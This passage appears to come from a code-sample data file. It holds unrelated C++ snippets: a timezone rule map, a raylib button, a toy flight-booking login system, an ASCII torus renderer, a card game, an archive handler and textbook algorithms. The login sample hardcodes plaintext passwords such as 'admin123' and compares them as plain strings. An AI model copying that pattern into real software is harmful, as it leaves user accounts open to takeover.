\"<-03>3\",\n    \"America/Argentina/Tucuman\": \"<-03>3\",\n    \"America/Argentina/Ushuaia\": \"<-03>3\",\n    \"America/Aruba\": \"AST4\",\n    \"America/Asuncion\": \"<-04>4<-03>,M10.1.0/0,M3.4.0/0\",\n    \"America/Atikokan\": \"EST5\",\n    \"America/Bahia\": \"<-03>3\",\n    \"America/Bahia_Banderas\": \"CST6\",\n    \"America/Barbados\": \"AST4\",\n    \"America/Belem\": \"<-03>3\",\n    \"America/Belize\": \"CST6\",\n    \"America/Blanc-Sablon\": \"AST4\",\n    \"America/Boa_Vista\": \"<-04>4\",\n    \"America/Bogota\": \"<-05>5\",\n    \"America/Boise\": \"MST7MDT,M3.2.0,M11.1.0\",\n    \"America/Cambridge_Bay\": \"MST7MDT,M3.2.0,M11.1.0\",\n    \"America/Campo_Grande\": \"<-04>4\",\n    \"America/Cancun\": \"EST5\",\n    \"America/Caracas\": \"<-04>4\",\n    \"America/Cayenne\": \"<-03>3\",\n    \"America/Cayman\": \"EST5\",\n    \"America/Chicago\": \"CST6CDT,M3.2.0,M11.1.0\",\n    \"America/Chihuahua\": \"CST6\",\n    \"America/Costa_Rica\": \"CST6\",\n    \"America/Creston\": \"MST7\",\n    \"America/Cuiaba\": \"<-04>4\",\n    \"America/Curacao\": \"AST4\",\n    \"America/Danmarkshavn\": \"GMT0\",\n    \"America/Dawson\": \"MST7\",\n    \"America/Dawson_Creek\": \"MST7\",\n    \"America/Denver\": \"MST7MDT,M3.2.0,M11.1.0\",\n    \"America/Detroit\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Dominica\": \"AST4\",\n    \"America/Edmonton\": \"MST7MDT,M3.2.0,M11.1.0\",\n    \"America/Eirunepe\": \"<-05>5\",\n    \"America/El_Salvador\": \"CST6\",\n    \"America/Fort_Nelson\": \"MST7\",\n    \"America/Fortaleza\": \"<-03>3\",\n    \"America/Glace_Bay\": \"AST4ADT,M3.2.0,M11.1.0\",\n    \"America/Godthab\": \"<-02>2<-01>,M3.5.0/-1,M10.5.0/0\",\n    \"America/Goose_Bay\": \"AST4ADT,M3.2.0,M11.1.0\",\n    \"America/Grand_Turk\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Grenada\": \"AST4\",\n    \"America/Guadeloupe\": \"AST4\",\n    \"America/Guatemala\": \"CST6\",\n    \"America/Guayaquil\": \"<-05>5\",\n    \"America/Guyana\": \"<-04>4\",\n    \"America/Halifax\": \"AST4ADT,M3.2.0,M11.1.0\",\n    \"America/Havana\": \"CST5CDT,M3.2.0/0,M11.1.0/1\",\n    \"America/Hermosillo\": \"MST7\",\n    \"America/Indiana/Indianapolis\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Knox\": \"CST6CDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Marengo\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Petersburg\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Tell_City\": \"CST6CDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Vevay\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Vincennes\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Indiana/Winamac\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Inuvik\": \"MST7MDT,M3.2.0,M11.1.0\",\n    \"America/Iqaluit\": \"EST5EDT,M3.2.0,M11.1.0\",\n    \"America/Jamaica\": \"EST5\",\n    \"America/Juneau\": \"AKST9AKDT,M3.2.0,M11.1.0\",\n    \"America/Kentucky/L",
    "#include \"Button.h\"\n#include \"Constants.h\"\n#include <raylib.h>\n\nButton::Button(int posX, int posY, int width, int height, int textSize, const char* text) {\n\tthis->posX = posX;\n\tthis->posY = posY;\n\tthis->width = width;\n\tthis->height = height;\n\tthis->text = text;\n\tthis->textSize = textSize;\n\tbounds = Rectangle{(float)posX, (float)posY, (float)width, (float)height};\n\tstate = 0;\n}\n\nvoid Button::update() {\n\t// Update the button state.\n\tVector2 mousePosition = GetMousePosition();\n\tbool isHovering = CheckCollisionPointRec(mousePosition, bounds);\n\tbool isPressed = IsMouseButtonPressed(MOUSE_LEFT_BUTTON);\n\tif (isHovering) {\n\t\tif (isPressed) {\n\t\t\tstate = 2;\n\t\t}\n\t\telse {\n\t\t\tstate = 1;\n\t\t}\n\t}\n\telse {\n\t\tstate = 0;\n\t}\n}\n\nvoid Button::draw() {\n\t// Draw the correct look for the button.\n\tif (state == 0) {\n\t\tDrawRectangleRec(bounds, buttonNoHoverColor);\n\t}\n\telse if (state == 1) {\n\t\tDrawRectangleRec(bounds, buttonHoverColor);\n\t}\n\telse if (state == 2) {\n\t\tDrawRectangleRec(bounds, buttonPressedColor);\n\t}\n\tVector2 textDimensions = MeasureTextEx(GetFontDefault(), text, textSize, 1.0f);\n\tDrawText(text, posX + (width - textDimensions.x)/2, posY + (height - textDimensions.y)/2, textSize, textColor);\n}",
    "#include <iostream>\r\n#include <unordered_map>\r\n#include <string>\r\n#include <vector>\r\n#include <stdexcept>\r\n\r\n// User class representing a system user (admin or customer)\r\nclass User {\r\npublic:\r\n    std::string username;\r\n    std::string password;\r\n    std::string role; // \"admin\" or \"customer\"\r\n\r\n    User(std::string username, std::string password, std::string role) \r\n        : username(username), password(password), role(role) {}\r\n\r\n    bool checkPassword(const std::string& passwordInput) {\r\n        return password == passwordInput;\r\n    }\r\n};\r\n\r\n// Simple User Authentication and Authorization System\r\nclass AuthSystem {\r\nprivate:\r\n    std::unordered_map<std::string, User> users;\r\n\r\npublic:\r\n    AuthSystem() {\r\n        // Pre-populate the system with users (admin and customer)\r\n        users[\"admin\"] = User(\"admin\", \"admin123\", \"admin\");\r\n        users[\"customer1\"] = User(\"customer1\", \"customer123\", \"customer\");\r\n        users[\"customer2\"] = User(\"customer2\", \"customer123\", \"customer\");\r\n    }\r\n\r\n    // Authenticate a user by username and password\r\n    User* authenticate(const std::string& username, const std::string& password) {\r\n        if (users.find(username) != users.end() && users[username].checkPassword(password)) {\r\n            return &users[username];\r\n        }\r\n        return nullptr; // Invalid credentials\r\n    }\r\n};\r\n\r\n// Class for the flight reservation system\r\nclass FlightReservationSystem {\r\nprivate:\r\n    AuthSystem& authSystem;\r\n    User* loggedInUser = nullptr;\r\n\r\npublic:\r\n    FlightReservationSystem(AuthSystem& authSys) : authSystem(authSys) {}\r\n\r\n    // Login method\r\n    bool login(const std::string& username, const std::string& password) {\r\n        loggedInUser = authSystem.authenticate(username, password);\r\n        return loggedInUser != nullptr;\r\n    }\r\n\r\n    // Logout method\r\n    void logout() {\r\n        loggedInUser = nullptr;\r\n        std::cout << \"Logged out successfully!\" << std::endl;\r\n    }\r\n\r\n    // Check if the current user is an admin\r\n    bool isAdmin() {\r\n        return loggedInUser && loggedInUser->role == \"admin\";\r\n    }\r\n\r\n    // Function available only for admins\r\n    void manageFlights() {\r\n        if (!isAdmin()) {\r\n            std::cout << \"You do not have permission to manage flights.\" << std::endl;\r\n            return;\r\n        }\r\n        std::cout << \"Managing flights... (only accessible by admins)\" << std::endl;\r\n    }\r\n\r\n    // Function available for both customers and admins\r\n    void searchFlights() {\r\n        std::cout << \"Searching for available flights...\" << std::endl;\r\n    }\r\n\r\n    // Function available only for customers\r\n    void bookFlight() {\r\n        if (isAdmin()) {\r\n            std::cout << \"Admins cannot book flights.\" << std::endl;\r\n            return;\r\n        }\r\n        std::cout << \"Booking a flight... (only accessible by customers)\" << std::endl;\r\n    }\r\n\r\n    // Function to display\r\n",
    "\n\n\n#include <chrono>\n#include <iostream>\n#include <thread>\n#include <vector>\n\n\n\n#define MAJORRAD 50\n#define MINORRAD 25\n#define HEIGHT 60\n#define WIDTH 240\n#define FRAMEDELAY 5\n#define ROTX 0.04\n#define ROTY 0.07\n#define ROTZ 0.02\n#define THETADELTA 0.1\n#define PHIDELTA 0.03\n#define SCALINGX 80\n#define SCALINGY 60\n#define VIEWDISTANCE 250\n\n\n\nconst float TAU = 6.28319;\nconst float LIGHT[] = {-2, 3, 3};\nconst char GRAD[] = \".,:;+**?%%#@@\";\nconst char BACKGROUND = ' ';\n\ntypedef struct Vec3 {\n    float x, y, z;\n\n    static Vec3 cons(float x, float y, float z) {\n        return Vec3 { x, y, z };\n    }\n\n    const Vec3 rotationx(float theta) {\n        float nx = this->x;\n        float ny = this->y * cos(theta) - this->z * sin(theta);\n        float nz = this->y * sin(theta) + this->z * cos(theta);\n        return Vec3::cons(nx, ny, nz);\n    }\n\n    const Vec3 rotationy(float theta) {\n        float nx = this->x * cos(theta) + this->z * sin(theta);\n        float ny = this->y;\n        float nz = -this->x * sin(theta) + this->z * cos(theta);\n        return Vec3::cons(nx, ny, nz);\n    }\n\n    const Vec3 rotationz(float theta) {\n        float nx = this->x * cos(theta) - this->y * sin(theta);\n        float ny = this->x * sin(theta) + this->y * cos(theta);\n        float nz = this->z;\n        return Vec3::cons(nx, ny, nz);\n    }\n\n    const Vec3 rotationchain(Vec3 angles) {\n        float nx = this->x, ny = this->y, nz = this->z;\n        Vec3 vec = Vec3::cons(nx, ny, nz);\n        vec = vec.rotationx(angles.x);\n        vec = vec.rotationy(angles.y);\n        vec = vec.rotationz(angles.z);\n        return vec;\n    }\n\n    const float dot_prod(Vec3 other) {\n        return this->x * other.x + this->y * other.y + this->z * other.z;\n    }\n\n    const Vec3 normalize() {\n        float length = sqrt(this->x * this->x + this->y * this->y + this->z * this->z);\n        if (length == 0) length = 1;\n        return Vec3::cons(this->x / length, this->y / length, this->z / length);\n    }\n} Vec3;\n\nVec3 get_light() {\n    return Vec3::cons(LIGHT[0], LIGHT[1], LIGHT[2]).normalize();\n}\n\nchar brightness_char(float luminosity) {\n    if (luminosity < 0) luminosity = 0;\n    return GRAD[(int)(luminosity * (strlen(GRAD)-1))];\n}\n\nclass Buffer {\npublic:\n    int height, width;\n    std::vector<char> visual;\n    std::vector<bool> colored;\n    std::vector<float> zbuffer;\n\n    static Buffer cons(int height, int width) {\n        return Buffer{\n            .height = height,\n            .width = width,\n            .visual = std::vector<char>(height * width, BACKGROUND),\n            .colored = std::vector<bool>(width * height, false),\n            .zbuffer = std::vector<float>(height * width, 0),\n        };\n    }\n\n    void display_frame() {\n        std::cout << \"\\x1b[H\";\n        std::string frame_buffer;\n        for (int i = 0; i < this->width * this->height; i += 1) {\n            if (i % this->width) {\n                if (this->colored[i] && this->visual[i] != BACKGROUND) {\n                    frame_buffer += \"\\x1b[38;2;89;44;4m\";\n                    frame_buffer += \"\\x1b[1m\";\n                    frame_buffer += \"\\x1b[40m\";\n                }\n                else if (this->visual[i] != BACKGROUND) {\n                    frame_buffer += \"\\x1b[38;2;173;158;95m\";\n                    frame_buffer += \"\\x1b[1m\";\n                    frame_buffer += \"\\x1b[40m\";\n                }\n                else  {\n                    frame_buffer += \"\\x1b[0m\";\n                }\n                frame_buffer.push_back(this->visual[i]);\n                continue;\n            }\n            frame_buffer.push_back('\\n');\n        }\n        frame_buffer += \"\\x1b[0m\";\n        std::cout << frame_buffer;\n        std::cout.flush();\n    }\n\n    const int halfheight() {\n        return this->height / 2;\n    }\n\n    const int halfwidth() {\n        return this->width / 2;\n    }\n\n    const int index(int x, int y) {\n        return y * this->width + x;\n    }\n\n    const bool inbounds(int x, int y) {\n        return x < this->width && y < this->height;\n    }\n\n    void clear() {\n        std::fill(visual.begin(), visual.end(), BACKGROUND);\n        std::fill(zbuffer.begin(), zbuffer.end(), 0);\n    }\n};\n\ntypedef struct Torus {\n    float radmajor;\n    float radminor;\n    Vec3 angle;\n    Vec3 angledelta;\n\n    static Torus cons(float radmajor, float radminor, Vec3 angle, Vec3 angledelta) {\n        return Torus { radmajor, radminor, angle, angledelta };\n    }\n\n    void rotate() {\n        angle.x += angledelta.x;\n        angle.y += angledelta.y;\n        angle.z += angledelta.z;\n    }\n} Torus;\n\nVec3 calculate_normal(float theta, float phi, float radmajor, float radminor) {\n    float costheta = cos(theta);\n    float sintheta = sin(theta);\n    float cosphi = cos(phi);\n    float sinphi = sin(phi);\n\n    Vec3 dtheta = Vec3::cons(\n        -radminor * sintheta * cosphi,\n        -radminor * sintheta * sinphi,\n        radminor * costheta\n    );\n    Vec3 dphi = Vec3::cons(\n        -(radmajor + radminor * costheta) * sinphi,\n        (radma",
    "#include \"players.h\"\r\n#include \"cards.h\"\r\n#include <random>\r\n#include <iostream>\r\n#include <functional>\r\n#include <chrono>\r\n#include <algorithm>\r\n\r\nnamespace CnD\r\n{\r\n\tnamespace Players\r\n\t{\r\n\t\tPlayer::Player() = default;\r\n\r\n\t\tstd::vector<Cards::Card*>* Player::GetHandPointer() { return &m_Hand; }\r\n\t\tstd::vector<Cards::Card*>* Player::GetPoolPointer() { return &m_Pool; }\r\n\r\n\t\tvoid Player::CollectCard(Cards::Card* collectedCard) { m_Hand.push_back(collectedCard); }\r\n\r\n\t\tvoid Player::PlayCard(int playedCardIndex)\r\n\t\t{\r\n\t\t\tauto cardInHandLocation = m_Hand.begin() + playedCardIndex;\r\n\t\t\ttry\r\n\t\t\t{\r\n\t\t\t\tm_Pool.insert(m_Pool.begin(), m_Hand[playedCardIndex]);\r\n\t\t\t\tm_Hand.erase(cardInHandLocation);\r\n\t\t\t}\r\n\t\t\tcatch (std::exception& e) { throw e; }\r\n\t\t}\r\n\r\n\t\tvoid Player::PlayCard(Cards::Card* playedCard)\r\n\t\t{\r\n\t\t\tauto cardInHandLocation = std::find(m_Hand.begin(), m_Hand.end(), playedCard);\r\n\t\t\ttry\r\n\t\t\t{\r\n\t\t\t\tm_Pool.insert(m_Pool.begin(), playedCard);\r\n\t\t\t\tm_Hand.erase(cardInHandLocation);\r\n\t\t\t}\r\n\t\t\tcatch (std::exception& e) { throw e; }\r\n\t\t}\r\n\r\n\t\tvoid Dealer::Initialize(bool includeJokers)\r\n\t\t{\r\n\t\t\tstd::vector<Cards::Card>* standardDeck = GetStandardDeckPointer();\r\n\t\t\tstd::vector<Cards::Card*>* drawPile = GetDrawPilePointer();\r\n\r\n\t\t\tInitializeDeck((*standardDeck), includeJokers);\r\n\t\t\tShuffle((*standardDeck), (*drawPile));\r\n\t\t}\r\n\r\n\t\tvoid Dealer::Shuffle(std::vector<Cards::Card>& inputDeck, std::vector<Cards::Card*>& outputDeck)\r\n\t\t{\t\r\n\t\t\tint sizeOfDeck = inputDeck.size();\r\n\t\t\t\r\n\t\t\tauto seed = std::chrono::system_clock::now().time_since_epoch().count();\r\n\t\t\tstd::default_random_engine rng(seed);\r\n\t\t\t\r\n\t\t\tstd::vector<int> cardIds;\r\n\t\t\tfor (int i = 0; i <= (inputDeck.size() - 1); i++)\r\n\t\t\t\tcardIds.push_back(i);\r\n\r\n\t\t\tstd::shuffle(cardIds.begin(), cardIds.end(), rng);\r\n\t\t\t\r\n\t\t\toutputDeck.clear();\r\n\t\t\tfor (int cardId : cardIds) outputDeck.push_back(&inputDeck[cardId]);\r\n\t\t}\r\n\r\n\t\tvoid Dealer::Shuffle(std::vector<Cards::Card*>& inputDeck)\r\n\t\t{\r\n\t\t\tauto seed = std::chrono::system_clock::now().time_since_epoch().count();\r\n\t\t\tstd::default_random_engine rng(seed);\r\n\r\n\t\t\tstd::shuffle(inputDeck.begin(), inputDeck.end(), rng);\r\n\t\t}\r\n\r\n\t\tvoid Dealer::Deal(std::vector<Cards::Card*>& deck, Player& dealtPlayer)\r\n\t\t{\r\n\t\t\tif(deck.size())\r\n\t\t\t{ \r\n\t\t\t\tdealtPlayer.CollectCard(deck[0]);\r\n\t\t\t\tdeck.erase(deck.begin());\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tbool CardIsInStack(const std::vector<Cards::Card*>& stack, const Cards::Card* card)\r\n\t{\r\n\t\tfor (Cards::Card* iteratedCard : stack)\r\n\t\t\tif (iteratedCard == card) return true;\r\n\r\n\t\treturn false;\r\n\t}\r\n}",
    "// MslzHandler.cpp\r\n\r\n#include \"StdAfx.h\"\r\n\r\n#include \"../../../C/CpuArch.h\"\r\n\r\n#include \"../../Common/ComTry.h\"\r\n#include \"../../Common/MyString.h\"\r\n\r\n#include \"../../Windows/PropVariant.h\"\r\n\r\n#include \"../Common/InBuffer.h\"\r\n#include \"../Common/ProgressUtils.h\"\r\n#include \"../Common/RegisterArc.h\"\r\n#include \"../Common/StreamUtils.h\"\r\n\r\n#include \"Common/DummyOutStream.h\"\r\n\r\nnamespace NArchive {\r\nnamespace NMslz {\r\n\r\nstatic const UInt32 kUnpackSizeMax = 0xFFFFFFE0;\r\n\r\nclass CHandler:\r\n  public IInArchive,\r\n  public IArchiveOpenSeq,\r\n  public CMyUnknownImp\r\n{\r\n  CMyComPtr<IInStream> _inStream;\r\n  CMyComPtr<ISequentialInStream> _seqStream;\r\n\r\n  bool _isArc;\r\n  bool _needSeekToStart;\r\n  bool _dataAfterEnd;\r\n  bool _needMoreInput;\r\n\r\n  bool _packSize_Defined;\r\n  bool _unpackSize_Defined;\r\n\r\n  UInt32 _unpackSize;\r\n  UInt64 _packSize;\r\n  UInt64 _originalFileSize;\r\n  UString _name;\r\n\r\n  void ParseName(Byte replaceByte, IArchiveOpenCallback *callback);\r\npublic:\r\n  MY_UNKNOWN_IMP2(IInArchive, IArchiveOpenSeq)\r\n  INTERFACE_IInArchive(;)\r\n  STDMETHOD(OpenSeq)(ISequentialInStream *stream);\r\n};\r\n\r\nstatic const Byte kProps[] =\r\n{\r\n  kpidPath,\r\n  kpidSize,\r\n  kpidPackSize,\r\n};\r\n\r\nIMP_IInArchive_Props\r\nIMP_IInArchive_ArcProps_NO_Table\r\n\r\nSTDMETHODIMP CHandler::GetNumberOfItems(UInt32 *numItems)\r\n{\r\n  *numItems = 1;\r\n  return S_OK;\r\n}\r\n\r\nSTDMETHODIMP CHandler::GetArchiveProperty(PROPID propID, PROPVARIANT *value)\r\n{\r\n  COM_TRY_BEGIN\r\n  NWindows::NCOM::CPropVariant prop;\r\n  switch (propID)\r\n  {\r\n    case kpidExtension: prop = \"mslz\"; break;\r\n    case kpidIsNotArcType: prop = true; break;\r\n    case kpidPhySize: if (_packSize_Defined) prop = _packSize; break;\r\n    case kpidErrorFlags:\r\n    {\r\n      UInt32 v = 0;\r\n      if (!_isArc) v |= kpv_ErrorFlags_IsNotArc;;\r\n      if (_needMoreInput) v |= kpv_ErrorFlags_UnexpectedEnd;\r\n      if (_dataAfterEnd) v |= kpv_ErrorFlags_DataAfterEnd;\r\n      prop = v;\r\n    }\r\n  }\r\n  prop.Detach(value);\r\n  return S_OK;\r\n  COM_TRY_END\r\n}\r\n\r\n\r\nSTDMETHODIMP CHandler::GetProperty(UInt32 /* index */, PROPID propID, PROPVARIANT *value)\r\n{\r\n  COM_TRY_BEGIN\r\n  NWindows::NCOM::CPropVariant prop;\r\n  switch (propID)\r\n  {\r\n    case kpidPath: if (!_name.IsEmpty()) prop = _name; break;\r\n    case kpidSize: if (_unpackSize_Defined || _inStream) prop = _unpackSize; break;\r\n    case kpidPackSize: if (_packSize_Defined || _inStream) prop = _packSize; break;\r\n  }\r\n  prop.Detach(value);\r\n  return S_OK;\r\n  COM_TRY_END\r\n}\r\n\r\nstatic const unsigned kSignatureSize = 9;\r\nstatic const unsigned kHeaderSize = kSignatureSize + 1 + 4;\r\n#define MSLZ_SIGNATURE { 0x53, 0x5A, 0x44, 0x44, 0x88, 0xF0, 0x27, 0x33, 0x41 }\r\n// old signature: 53 5A 20 88 F0 27 33\r\nstatic const Byte kSignature[kSignatureSize] = MSLZ_SIGNATURE;\r\n\r\n// we support only 3 chars strings here\r\nstatic const char * const g_Exts[] =\r\n{\r\n    \"bin\"\r\n  , \"dll\"\r\n  , \"exe\"\r\n  , \"kmd\"\r\n  , \"pdf\"\r\n  , \"sys\"\r\n};\r\n\r\nvoid CHandler::ParseName(Byte replaceByte, IArchiveOpenCallback *callback)\r\n{\r\n  if (!callback)\r\n    return;\r\n  CMyComPtr<IArchiveOpenVolumeCallback> volumeCallback;\r\n  callback->QueryInterface(IID_IArchiveOpenVolumeCallback, (void **)&volumeCallback);\r\n  if (!volumeCallback)\r\n    return;\r\n\r\n  NWindows::NCOM::CPropVariant prop;\r\n  if (volumeCallback->GetProperty(kpidName, &prop) != S_OK || prop.vt != VT_BSTR)\r\n    return;\r\n\r\n  UString s = prop.bstrVal;\r\n  if (s.IsEmpty() ||\r\n      s.Back() != L'_')\r\n    return;\r\n  \r\n  s.DeleteBack();\r\n  _name = s;\r\n   \r\n  if (replaceByte == 0)\r\n  {\r\n    if (s.Len() < 3 || s[s.Len() - 3] != '.')\r\n      return;\r\n    for (unsigned i = 0; i < ARRAY_SIZE(g_Exts); i++)\r\n    {\r\n      const char *ext = g_Exts[i];\r\n      if (s[s.Len() - 2] == (Byte)ext[0] &&\r\n          s[s.Len() - 1] == (Byte)ext[1])\r\n      {\r\n        replaceByte = ext[2];\r\n        break;\r\n      }\r\n    }\r\n  }\r\n  \r\n  if (replaceByte >= 0x20 && replaceByte < 0x80)\r\n    _name += (char)replaceByte;\r\n}\r\n\r\nSTDMETHODIMP CHandler::Open(IInStream *stream, const UInt64 * /* maxCheckStartPosition */,\r\n    IArchiveOpenCallback *callback)\r\n{\r\n  COM_TRY_BEGIN\r\n  {\r\n    Close();\r\n    _needSeekToStart = true;\r\n    Byte buffer[kHeaderSize];\r\n    RINOK(ReadStream_FALSE(stream, buffer, kHeaderSize));\r\n    if (memcmp(buffer, kSignature, kSignatureSize) != 0)\r\n      return S_FALSE;\r\n    _unpackSize = GetUi32(buffer + 10);\r\n    if (_unpackSize > kUnpackSizeMax)\r\n      return S_FALSE;\r\n    RINOK(stream->Seek(0, STREAM_SEEK_END, &_originalFileSize));\r\n    _packSize = _originalFileSize;\r\n\r\n    ParseName(buffer[kSignatureSize], callback);\r\n\r\n    _isArc = true;\r\n    _unpackSize_Defined = true;\r\n    _inStream = stream;\r\n    _seqStream = stream;\r\n  }\r\n  return S_OK;\r\n  COM_TRY_END\r\n}\r\n\r\nSTDMETHODIMP CHandler::Close()\r\n{\r\n  _originalFileSize = 0;\r\n  _packSize = 0;\r\n  _unpackSize = 0;\r\n\r\n  _isArc = false;\r\n  _needSeekToStart = false;\r\n  _dataAfterEnd = false;\r\n  _needMoreInput = false;\r\n\r\n  _packSize_Defined = false;\r\n  _unpackSize_Defined =  false;\r\n\r\n  _seqStream.Release();\r\n  _inStream.Release();\r\n  ",
    "//need to revise \n//copy pasted\n\nstruct trieNode {\n    trieNode* children[26];\n    bool isEndOfWord;\n};\n\ntrieNode* getNode() {\n    trieNode* newNode = new trieNode();\n    newNode->isEndOfWord = false;\n    for(int i = 0; i < 26; i++) {\n        newNode->children[i] = NULL;\n    }\n    return newNode;\n}\n\nclass Trie {\n    public:\n        trieNode* root;\n\n        Trie() {\n            root = getNode();\n        }\n\n        void insert(string word) {\n            trieNode* pCrawl = root;\n            for(int i = 0; i < word.length(); i++) {\n                int idx = word[i] - 'a';\n                if(pCrawl->children[idx] == NULL) {\n                    pCrawl->children[idx] = getNode();\n                }\n                pCrawl = pCrawl->children[idx];\n            }\n            pCrawl->isEndOfWord = true;\n        }\n\n        bool searchPrefix(string prefix) {\n            trieNode* pCrawl = root;\n            for(int i = 0; i < prefix.length(); i++) {\n                int idx = prefix[i] - 'a';\n                if(pCrawl->children[idx] == NULL) {\n                    return false;\n                }\n                pCrawl = pCrawl->children[idx];\n            }\n\n            return true;\n        }\n};\n\nclass Solution {\npublic:\n    int countPrefixSuffixPairs(vector<string>& words) {\n        int n = words.size();\n\n        int count = 0;\n\n        for(int j = 0; j < n; j++) {\n            Trie prefixTrie; //calls constrctor\n            Trie suffixTrie; //calls constructor\n\n            prefixTrie.insert(words[j]);\n            string reversed = words[j];\n            reverse(begin(reversed), end(reversed));\n\n            suffixTrie.insert(reversed);\n\n            for(int i = 0; i < j; i++) {\n                if(words[i].length() > words[j].length()) {\n                    continue;\n                }\n\n                string rev = words[i];\n                reverse(begin(rev), end(rev));\n\n                if(prefixTrie.searchPrefix(words[i]) == true && suffixTrie.searchPrefix(rev) == true) {\n                    count++;\n                }\n            }\n        }\n\n        return count;\n    }\n};\n\n",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <stack>\n#include <string>\nusing namespace std;\n\n// L\u1edbp bi\u1ec3u di\u1ec5n m\u1ed9t \u0111\u1ec9nh trong \u0111\u1ed3 th\u1ecb\nclass Vertex\n{\npublic:\n    string name; // T\u00ean c\u1ee7a \u0111\u1ec9nh\n\n    Vertex(string name) : name(name) {}\n};\n\n// C\u1ea5u tr\u00fac bi\u1ec3u di\u1ec5n m\u1ed9t c\u1ea1nh gi\u1eefa hai \u0111\u1ec9nh\nstruct Edge\n{\n    int length = 0; // \u0110\u1ed9 d\u00e0i m\u1eb7c \u0111\u1ecbnh l\u00e0 0\n};\n\n// L\u1edbp bi\u1ec3u di\u1ec5n \u0111\u1ed3 th\u1ecb\nclass Graph\n{\n    static const int MAX = 5; // S\u1ed1 \u0111\u1ec9nh t\u1ed1i \u0111a\n    vector<Vertex> vertexList; // Danh s\u00e1ch \u0111\u1ec9nh\n    Edge edgeMatrix[MAX][MAX]; // Ma tr\u1eadn c\u1ea1nh\n\npublic:\n    // H\u00e0m kh\u1edfi t\u1ea1o\n    Graph()\n    {\n        for (int i = 0; i < MAX; i++)\n            for (int j = 0; j < MAX; j++)\n                edgeMatrix[i][j].length = 0;\n    }\n\n    // Th\u00eam \u0111\u1ec9nh m\u1edbi\n    void AddNode(Vertex v)\n    {\n        if (vertexList.size() < MAX)\n        {\n            vertexList.push_back(v);\n        }\n        else\n        {\n            cout << \"Kh\u00f4ng th\u1ec3 th\u00eam \u0111\u1ec9nh m\u1edbi. Gi\u1edbi h\u1ea1n t\u1ed1i \u0111a (\" << MAX << \") \u0111\u00e3 \u0111\u1ea1t.\\n\";\n        }\n    }\n\n    // X\u00f3a m\u1ed9t \u0111\u1ec9nh theo t\u00ean\n    void RemoveNode(string name)\n    {\n        int index = GetVertexIndex(name);\n        if (index == -1)\n        {\n            cout << \"Kh\u00f4ng t\u00ecm th\u1ea5y \u0111\u1ec9nh \u0111\u1ec3 x\u00f3a.\\n\";\n            return;\n        }\n\n        // X\u00f3a \u0111\u1ec9nh kh\u1ecfi danh s\u00e1ch \u0111\u1ec9nh\n        vertexList.erase(vertexList.begin() + index);\n\n        // X\u00f3a c\u00e1c c\u1ea1nh li\u00ean quan trong ma tr\u1eadn c\u1ea1nh\n        for (int i = 0; i < MAX; i++)\n        {\n            edgeMatrix[index][i].length = 0;\n            edgeMatrix[i][index].length = 0;\n        }\n\n        cout << \"\u0110\u1ec9nh \" << name << \" \u0111\u00e3 \u0111\u01b0\u1ee3c x\u00f3a.\\n\";\n    }\n\n    // Th\u00eam c\u1ea1nh gi\u1eefa hai \u0111\u1ec9nh\n    void AddEdge(string name1, string name2, int length)\n    {\n        int index1 = GetVertexIndex(name1);\n        int index2 = GetVertexIndex(name2);\n\n        if (index1 == -1 || index2 == -1)\n        {\n            cout << \"Kh\u00f4ng t\u00ecm th\u1ea5y m\u1ed9t ho\u1eb7c c\u1ea3 hai \u0111\u1ec9nh.\\n\";\n            return;\n        }\n\n        edgeMatrix[index1][index2].length = length;\n        edgeMatrix[index2][index1].length = length; // \u0110\u1ed3 th\u1ecb v\u00f4 h\u01b0\u1edbng\n    }\n\n    // X\u00f3a c\u1ea1nh gi\u1eefa hai \u0111\u1ec9nh\n    void RemoveEdge(string name1, string name2)\n    {\n        int index1 = GetVertexIndex(name1);\n        int index2 = GetVertexIndex(name2);\n\n        if (index1 == -1 || index2 == -1)\n        {\n            cout << \"Kh\u00f4ng t\u00ecm th\u1ea5y m\u1ed9t ho\u1eb7c c\u1ea3 hai \u0111\u1ec9nh.\\n\";\n            return;\n        }\n\n        edgeMatrix[index1][index2].length = 0;\n        edgeMatrix[index2][index1].length = 0;\n        cout << \"C\u1ea1nh gi\u1eefa \" << name1 << \" v\u00e0 \" << name2 << \" \u0111\u00e3 \u0111\u01b0\u1ee3c x\u00f3a.\\n\";\n    }\n\n    // T\u00ecm ch\u1ec9 s\u1ed1 c\u1ee7a m\u1ed9t \u0111\u1ec9nh theo t\u00ean\n    int GetVertexIndex(string name)\n    {\n        for (int i = 0; i < vertexList.size(); i++)\n        {\n            if (vertexList[i].name == name)\n                return i;\n        }\n        return -1;\n    }\n\n    // Duy\u1ec7t \u0111\u1ed3 th\u1ecb theo chi\u1ec1u s\u00e2u (DFS)\n    void DFS(string startName)\n    {\n        int startIndex = GetVertexIndex(startName);\n        if (startIndex == -1)\n        {\n            cout << \"Kh\u00f4ng t\u00ecm th\u1ea5y \u0111\u1ec9nh b\u1eaft \u0111\u1ea7u.\\n\";\n            return;\n        }\n\n        vector<bool> visited(vertexList.size(), false);\n        stack<int> s;\n        s.push(startIndex);\n\n        cout << \"Th\u1ee9 t\u1ef1 duy\u1ec7t DFS: \";\n        while (!s.empty())\n        {\n            int current = s.top();\n            s.pop();\n\n            if (!visited[current])\n            {\n                cout << vertexList[current].name << \" \";\n                visited[current] = true;\n\n                for (int i = vertexList.size() - 1; i >= 0; i--)\n                {\n                    if (edgeMatrix[current][i].length > 0 && !visited[i])\n                    {\n                        s.push(i);\n                    }\n                }\n            }\n        }\n        cout << endl;\n    }\n\n    // Duy\u1ec7t \u0111\u1ed3 th\u1ecb theo chi\u1ec1u r\u1ed9ng (BFS)\n    void BFS(string startName)\n    {\n        int startIndex = GetVertexIndex(startName);\n        if (startIndex == -1)\n        {\n            cout << \"Kh\u00f4ng t\u00ecm th\u1ea5y \u0111\u1ec9nh b\u1eaft \u0111\u1ea7u.\\n\";\n            return;\n        }\n\n        vector<bool> 